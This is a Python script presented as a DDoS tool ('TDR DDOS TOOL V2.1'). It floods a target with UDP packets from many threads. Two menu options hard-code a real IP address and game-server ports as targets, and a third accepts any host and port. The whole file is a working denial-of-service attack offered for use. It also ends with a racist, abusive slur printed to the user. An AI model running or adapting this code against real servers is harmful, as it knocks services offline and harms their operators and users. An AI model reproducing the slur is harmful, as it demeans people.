import random
import socket
import threading
import time
import os,sys
import random, socket, threading
from dotenv import load_dotenv
load_dotenv()
u=os.getenv("usr")
p=os.getenv("psw")


os.system("clear")
print("""
\u001b[35m
╭━━━━┳━━━┳━━━╮                          
┃╭╮╭╮┣╮╭╮┃╭━╮┃                                  
╰╯┃┃╰╯┃┃┃┃╰━╯┃                          
╱╱┃┃╱╱┃┃┃┃╭╮╭╯                          
╱╱┃┃╱╭╯╰╯┃┃┃╰╮                          
╱╱╰╯╱╰━━━┻╯╰━╯                          
╭━━━┳━━━┳━━━┳━━━╮                          
╰╮╭╮┣╮╭╮┃╭━╮┃╭━╮┃                          
╱┃┃┃┃┃┃┃┃┃╱┃┃╰━━╮                          
╱┃┃┃┃┃┃┃┃┃╱┃┣━━╮┃                          
╭╯╰╯┣╯╰╯┃╰━╯┃╰━╯┃                          
╰━━━┻━━━┻━━━┻━━━╯                          
╭━━━━┳━━━┳━━━┳╮                          
┃╭╮╭╮┃╭━╮┃╭━╮┃┃                          
╰╯┃┃╰┫┃╱┃┃┃╱┃┃┃                             
╱╱┃┃╱┃┃╱┃┃┃╱┃┃┃╱╭╮                        
╱╱┃┃╱┃╰━╯┃╰━╯┃╰━╯┃                        
╱╱╰╯╱╰━━━┻━━━┻━━━╯v2.1 

DEVELOPED BY : TDR ARNOLD.
Tool Version: TDR DDOS TOOL V2.1

Tdr Arnold""")
print("Lets start? (yes)")
choice=str(input("┗━>\033[0m:"))
if choice=="yes" or choice=="y":
  print("\033[31m━━━ Choose an option.\n  [1]NGRP MAIN SERVER\n  [2]NGRP PW SERVER\n  [3]OTHER SERVERS")
  opt=int(input("┗━>\033[0m:"))
  time.sleep(1)
  if opt==3:
    print("\033[31m━━━ Host/IP")
    ip = str(input("┗━>\033[0m:"))
    time.sleep(1)
    print("\033[31m━━━ Port")
    port = int(input("┗━>\033[0m:"))
    time.sleep(1)
    print("\033[32m━━━ Pakets")	
    print("\033[32m━━━ Min Pakets 100")
    times = int(input("┗━>\033[0m:"))
    time.sleep(1)
    print("\033[31m━━━ Threads")
    print("\033[31m━━━ Min Threads 110")
    threads = int(input("┗━>\033[0m:"))
  elif opt==1:
    print("\033[31m━━━ Enter username")
    user = input("┗━>\033[0m:")
    print("\033[31m━━━ Enter password")
    pswd = input("┗━>:")
    if user == u and pswd==p:
      print("\033[31m━━━ Login succesfull")
      time.sleep(1)
      print("\033[31m━━━ Loading....10%")
      time.sleep(1)
      print("\033[31m━━━ Loading......20%")
      time.sleep(1)
      print("\033[31m━━━ Loading.......50%")
      time.sleep(1)
      print("\033[31m━━━ Loading........86%")
      time.sleep(1)
      print("\033[31m━━━ Loading.........100%")
      ip="103.166.228.31"
      port=7777
      print("\033[32m━━━ Pakets")	
      print("\033[32m━━━ Min Pakets 100")
      times = int(input("┗━>\033[0m:"))
      time.sleep(1)
      print("\033[31m━━━ Threads")
      print("\033[31m━━━ Min Threads 110")
      threads = int(input("┗━>\033[0m:"))
    else:
      print("\033[31m━━━ Incorrect username or password")
  elif opt==2:
    print("\033[31m━━━ Enter username")
    user = input("┗━>\033[0m:")
    print("\033[31m━━━ Enter password")
    pswd = input("┗━>:")
    if user == u and pswd==p:
      print("\033[31m━━━ Login succesfull")
      time.sleep(1)
      print("\033[31m━━━ Loading....10%")
      time.sleep(1)
      print("\033[31m━━━ Loading......20%")
      time.sleep(1)
      print("\033[31m━━━ Loading.......50%")
      time.sleep(1)
      print("\033[31m━━━ Loading........86%")
      time.sleep(1)
      print("\033[31m━━━ Loading.........100%")
      ip="103.166.228.31"
      port=7775
      print("\033[32m━━━ Pakets")	
      print("\033[32m━━━ Min Pakets 100")
      times = int(input("┗━>\033[0m:"))
      time.sleep(1)
      print("\033[31m━━━ Threads")
      print("\033[31m━━━ Min Threads 110")
      threads = int(input("┗━>\033[0m:"))
    else:
      print("\033[31m━━━ Incorrect username or password")
  def xxxx():
    data = random._urandom(998)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = (str(ip),int(port))
        for x in range(times):
          s.sendto(data,addr)
          if ip=="103.166.228.31"and port==7777:
            print(i +" \033[32m=====> Attacking To Ngrp Server \033[0m%s:%s!!!"%(ip,port))
          elif ip=="103.166.228.31"and port==7775:
            print(i +" \033[32m=====> Attacking To Ngrp pointwar  Server \033[0m%s:%s!!!"%(ip,port))
          else:
            print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
      except:
        print("[!] Server Attack")
  def xxx():
    data = random._urandom(998)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = (str(ip),int(port))
        for x in range(times):
          s.sendto(data,addr)
          if ip=="103.166.228.31"and port==7777:
            print(i +" \033[32m=====> Attacking To Ngrp Server \033[0m%s:%s!!!"%(ip,port))
          elif ip=="103.166.228.31"and port==7775:
            print(i +" \033[32m=====> Attacking To Ngrp pointwar  Server \033[0m%s:%s!!!"%(ip,port))
          else:
            print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
      except:
        print("[!] Server Attack")
  def xx():
    data = random._urandom(998)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = (str(ip),int(port))
        for x in range(times):
          s.sendto(data,addr)
          if ip=="103.166.228.31"and port==7777:
            print(i +" \033[32m=====> Attacking To Ngrp Server \033[0m%s:%s!!!"%(ip,port))
          elif ip=="103.166.228.31"and port==7775:
            print(i +" \033[32m=====> Attacking To Ngrp pointwar  Server \033[0m%s:%s!!!"%(ip,port))
          else:
            print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
      except:
        print("[!] Server Attack")
  def x():
    data = random._urandom(998)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = (str(ip),int(port))
        for x in range(times):
          s.sendto(data,addr)
          if ip=="103.166.228.31"and port==7777:
            print(i +" \033[32m=====> Attacking To Ngrp Server \033[0m%s:%s!!!"%(ip,port))
          elif ip=="103.166.228.31"and port==7775:
            print(i +" \033[32m=====> Attacking To Ngrp pointwar  Server \033[0m%s:%s!!!"%(ip,port))
          else:
            print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
      except:
        print("[!] Server Attack")
  if user==u and pswd==p:
    for y in range(threads):
      if choice == 'yes' or "y":
          th = threading.Thread(target = xxxx)
          th.start()
          th = threading.Thread(target = xxx)
          th.start()
          th = threading.Thread(target = xx)
          th.start()
          th = threading.Thread(target = x)
          th.start()
else:
  print("Fuck your mom nigga.")    